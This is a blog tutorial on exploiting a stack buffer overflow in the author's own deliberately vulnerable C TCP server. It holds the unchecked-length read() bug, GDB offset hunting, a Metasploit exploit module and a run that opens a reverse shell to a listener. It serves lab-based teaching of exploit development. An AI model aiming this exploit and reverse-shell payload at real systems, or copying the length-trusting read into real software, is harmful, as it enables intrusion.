---
layout : post
title : Exploiting Simple Buffer Overflow (3) | Writing a simple Metasploit module
comments : true
---

Hello! It's been a while since the last post, but I'm currently doing a summer internship at Twitter, which has been extremely fun. 
And what's more, I will probably be able to go to DEF CON 24 in Las Vegas!
I will definitely post about it after the conference, but for this article, I want to continue the sequence of Exploiting Simple Buffer Overflow. 


Today, I will show you how to exploit a simple buffer overflow against my custom vulnerable TCP server, by developing a custom exploit module for Metasploit Framework.
As you know, [Metasploit Framework](http://metasploit.com) is the most popular pentesting tool out there. It is extremely powerful and covering exploits of most public vulnerabilities, and
thanks to its user-friendly framework, it is also really easy to develop your own exploit module. 

So, let's dive in. I have prepared a stupidly simple and vulnerable TCP server in C, as well as its client in Python --- you can download them from [here](https://github.com/taishi8117/bof_lab/tree/master/vuln_server).

-------------------

### Vulnerable Server
The source code for the vulnerable server is located [here](https://github.com/taishi8117/bof_lab/blob/master/vuln_server/tcp_server.c). 
It is a very simple TCP server, so I will omit explaining what each code does, but below is the vulnerable part, which is called as soon as a client socket is accepted.

```C
#define BUFFER_SIZE 1024
#define HEADER_SIZE 4

void vuln_read(int cli_fd) {
  char buffer[BUFFER_SIZE];

  // read 4 bytes to get how many bytes to read
  // assuming that it's little endian
  int to_read;
  read(cli_fd, &to_read, HEADER_SIZE);
  printf("Will read %d bytes\n", to_read);

  int read_bytes = read(cli_fd, buffer, to_read);
  printf("Read: %d bytes\n", read_bytes);
  printf("Incoming message: %s\n", buffer);
}
```

First, it reads 4-byte header, indicating how many bytes to read for the body.
And using that value, it then reads the body into `buffer`. As you can guess, it is obvious that
`int read_bytes = read(cli_fd, buffer, to_read);` has a buffer overflow vulnerability, since 
`to_read` can be much larger than 1024!

Let's try it out. I will use Ubuntu 14.04 64-bit for this experiment, although
I will compile the server in 32-bit mode for the sake of simplicity. 

```
$ uname -a
Linux sirius 3.13.0-63-generic #103-Ubuntu SMP Fri Aug 14 21:42:59 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:  Ubuntu 14.04.4 LTS
Release:  14.04
Codename: trusty
```

For the `Makefile`, make sure that if you are compiling in 32-bit mode on a 64-bit machine,
`CFLAGS=-m32` is turned on, as well as `-fno-stack-protector` and `-z execstac`.
```Makefile
CC=gcc
CFLAGS=-m32 -std=c99 -Wall -fno-stack-protector -z execstack  # for x64
#CFLAGS=-std=c99 -Wall -fno-stack-protector -z execstack

all: tcp_server

tcp_server: tcp_server.o
  $(CC) $(CFLAGS) -o $@ $^

tcp_server.o: tcp_server.c

clean:
  rm tcp_server.o tcp_server
```

Also, I will do this experiment without ASLR. If you want to learn how to bypass ASLR,
you can check the [previous article](http://taishi8117.github.io/2015/11/11/stack-bof-2/).

Let's look at how this server behaves. Open a terminal, and compile and start the server by `./tcp_server 1234`.
On another terminal, modify the [Python client](https://github.com/taishi8117/bof_lab/blob/master/vuln_server/simple_client.py), so `MESSAGE = "Hello\n"` and executes it. You should see the following.

```
$ cat simple_client.py | grep "MESSAGE = "
MESSAGE = "Hello\n"
$ python simple_client.py 1234
Received data:  Hello there!

```

And on the server terminal, you should see the following.

```
$ make all
gcc -m32 -std=c99 -Wall -fno-stack-protector -z execstack    -c -o tcp_server.o tcp_server.c
gcc -m32 -std=c99 -Wall -fno-stack-protector -z execstack  -o tcp_server tcp_server.o
$ ./tcp_server 1234
Will read 6 bytes
Read: 6 bytes
Incoming message: Hello

```

Cool! Let's also check the offset for EIP, using GDB and [peda](https://github.com/longld/peda)'s `pattern_create` function. 
In this case, since the buffer size is 1024, I created a pattern with 1200 characters, so it will be large enough to overflow.

```
⇒  gdb -q ./tcp_server 
Reading symbols from ./tcp_server...(no debugging symbols found)...done.
gdb-peda$ pattern_create 1200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%ZA%vA%wA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsnAsSAsoAsTAspAsUAsqAsVAsrAsWAssAsXAstAsYAsuAsZAsvAswAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABnABSABoABTABpABUABqABVABrABWABsABXABtABYABuABZABvABwABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$nA$SA$oA$TA$pA$UA$qA$VA$rA$WA$sA$XA$tA$YA$uA$ZA$vA$wA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAn'
```

Copy the pattern to the value of `MESSAGE` for the client script.
Then start the server inside the GDB by `run 1234`, and on another terminal, start the client.
The output on the client terminal should look like the following.

```
$ cat simple_client.py | grep "MESSAGE = "
MESSAGE = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%ZA%vA%wA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsnAsSAsoAsTAspAsUAsqAsVAsrAsWAssAsXAstAsYAsuAsZAsvAswAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABnABSABoABTABpABUABqABVABrABWABsABXABtABYABuABZABvABwABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$nA$SA$oA$TA$pA$UA$qA$VA$rA$WA$sA$XA$tA$YA$uA$ZA$vA$wA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAn'
$ python simple_client.py 1234

```

On the other hand, the output for the server side should look like the following.


```
gdb-peda$ run 1234
Starting program: /home/taishi/workspace/bof_lab/vuln_server/tcp_server 1234
Will read 1200 bytes
Read: 1200 bytes
Incoming message: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%ZA%vA%wA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsnAsSAsoAsTAspAsUAsqAsVAsrAsWAssAsXAstAsYAsuAsZAsvAswAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABnABSABoABTABpABUABqABVABrABWABsABXABtABYABuABZABvABwABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$nA$SA$oA$TA$pA$UA$qA$VA$rA$WA$sA$XA$tA$YA$uA$ZA$v�

Program received signal SIGSEGV, Segmentation fault.

Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x6e41736e in ?? ()

gdb-peda$ pattern_search
Registers contain pattern buffer:
EBP+0 found at offset: 1036
EIP+0 found at offset: 1040
Registers point to pattern buffer:
[ESP] --> offset 1044 - size ~156
Pattern buffer found at:
0xf7fd8000 : offset 1006 - size   18 (mapped)
0xf7fd8015 : offset    3 - size 1003 (mapped)
0xffffcbcc : offset    0 - size 1024 ($sp + -0x414 [-261 dwords])
0xffffcfd0 : offset 1028 - size  172 ($sp + -0x10 [-4 dwords])
References to pattern buffer found at:
0xf7fb0ac4 : 0xf7fd8000 (/lib/i386-linux-gnu/libc-2.19.so)
0xf7fb0ac8 : 0xf7fd8000 (/lib/i386-linux-gnu/libc-2.19.so)
0xf7fb0acc : 0xf7fd8000 (/lib/i386-linux-gnu/libc-2.19.so)
0xf7fb0ad0 : 0xf7fd8000 (/lib/i386-linux-gnu/libc-2.19.so)
0xf7fb0ad4 : 0xf7fd8000 (/lib/i386-linux-gnu/libc-2.19.so)
0xf7fb0ad8 : 0xf7fd8000 (/lib/i386-linux-gnu/libc-2.19.so)
0xf7fb0adc : 0xf7fd8000 (/lib/i386-linux-gnu/libc-2.19.so)
0xffffc554 : 0xf7fd8000 ($sp + -0xa8c [-675 dwords])
0xffffc5a0 : 0xf7fd8000 ($sp + -0xa40 [-656 dwords])
0xffffc5b4 : 0xf7fd8000 ($sp + -0xa2c [-651 dwords])
0xffffc5c8 : 0xf7fd8000 ($sp + -0xa18 [-646 dwords])
0xffffc5d4 : 0xf7fd8000 ($sp + -0xa0c [-643 dwords])
0xffffc614 : 0xf7fd8000 ($sp + -0x9cc [-627 dwords])
0xffffc710 : 0xffffcbcc ($sp + -0x8d0 [-564 dwords])
0xffffcba0 : 0xffffcbcc ($sp + -0x440 [-272 dwords])
0xffffcbb4 : 0xffffcbcc ($sp + -0x42c [-267 dwords])

gdb-peda$ print $esp
$1 = (void *) 0xffffcfe0
```

Using `pattern_search`, we now know that EIP will be overwriten by 4 bytes starting from 1040th character
in the body. This means that including the 4-byte header, the RET address needs to start from 1044th character. 
We also know that the address of the top of the stack is `0xffffcfe0`, from which our payload will
be written and executed. Now, we know everything for the exploit!

### Writing a Metasploit exploit module

Writing an exploit module for Metasploit Framework is quite simple, but you need to first set up the development environment.
Although I will not elaborate on this, you can refer to [this page](https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment), which has a perfect instruction!

Now, I assume that you have successfully set up the development environment for Metasploit :-)

Just to give you some sense of how the codes are organized, exploit modules are located under `metasploit-framework/modules/exploits` directory, payloads are under `metasploit-framework/modules/payloads`, and the core library for Metasploit is located under `metasploit-framework/lib/msf`.

For this article, I will create a module called `bof_lab.rb` under `metasploit-framework/modules/exploits/custom` directory. It can be downloaded from [here](https://github.com/taishi8117/bof_lab/blob/master/vuln_server/bof_lab.rb). 
If you want to test it with Metasploit Framework, make sure `bof_lab.rb` is copied somewhere under `metasploit-framework/modules/exploits`, so it is automatically loaded!

I will also not elaborate on the details of how to develop a custom module, since there are a lot of documentation out there. You should probably read [this](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit) first, if you are interested.
Instead, I will briefly explain the code.

First, I included Metasploit's TCP library (`include Msf::Exploit::Remote::Tcp`), as I need to connect to a TCP server.

In [`initialize()`](https://github.com/taishi8117/bof_lab/blob/master/vuln_server/bof_lab.rb#L14), you need to define some information about the exploit module, such as name, description, payload encoding and target architecture. 
In this case, I will not use any payload encoding for the sake of simplicity, and the target architecture would be `linux x86` (this is because I compiled the server in 32-bit mode).
I will also define `Ret` to indicate where the payload will be located (which is `0xffffcfe0` as we found earlier).

```
'Targets'        => 
        [
          [
            'Linux x86',
            {
              'Arch' => ARCH_X86,
              'Ret'      => 0xffffcfe0
            }
          ]
        ],
```

[`check()`](https://github.com/taishi8117/bof_lab/blob/master/vuln_server/bof_lab.rb#L47) method is for testing whether a target is vulnerable. But for the sake of simplicity, I made it to return that the target host is always vulnerable.

Now, [`exploit()`](https://github.com/taishi8117/bof_lab/blob/master/vuln_server/bof_lab.rb#L51) is the core part of this module, as the name suggests obviously. 

```ruby
def exploit
    connect

    print_status("Sending #{payload.encoded.length} byte payload...")

    # Build the buffer for transmission
    buf = "A" * 1044
    buf += [ target.ret ].pack('V')
    buf += payload.encoded

    # Send it off
    sock.put(buf)
    sock.get

    handler
end
```

It basically connects to the server, sends `A` for 1044 times (which is the offset), and `Ret` and finally the payload. That's it, super simple!!


### Exploit!

Now, let's try an exploit!

Note that my environment was the following:

- Server (`10.0.1.130`) listening on port 1234, username: `sirius`
- MSF (`127.0.0.1`), reverse handler listening on port 8888

First, start the `msfconsole` and direct to the module that you just created.

```
$ ./msfconsole -q
msf > use exploit/custom/bof_lab 
msf exploit(bof_lab) > show options

Module options (exploit/custom/bof_lab):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT                   yes       The target port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86
```

Let's specify options, according to the environment. For payloads, I will use `linux/x86/shell/reverse_tcp`, so I can get a shell of the server. You can also specify other payloads, if you want to play around with different ways.

```
msf exploit(bof_lab) > set RHOST 10.0.1.130
RHOST => 10.0.1.130
msf exploit(bof_lab) > set RPORT 1234
RPORT => 1234
msf exploit(bof_lab) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf exploit(bof_lab) > set LPORT 8888
LPORT => 8888
msf exploit(bof_lab) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf exploit(bof_lab) > exploit

[*] Started reverse TCP handler on 127.0.0.1:8888 
[*] 10.0.1.130:1234 - Sending 71 byte payload...
[*] Sending stage (36 bytes) to 127.0.0.1
[*] Command shell session 1 opened (127.0.0.1:8888 -> 127.0.0.1:33734) at 2016-07-25 00:49:52 -0700
```

Here we go! You got it! 

```
msf exploit(bof_lab) > sessions -i 1
[*] Starting interaction with 1...

whoami
sirius
```
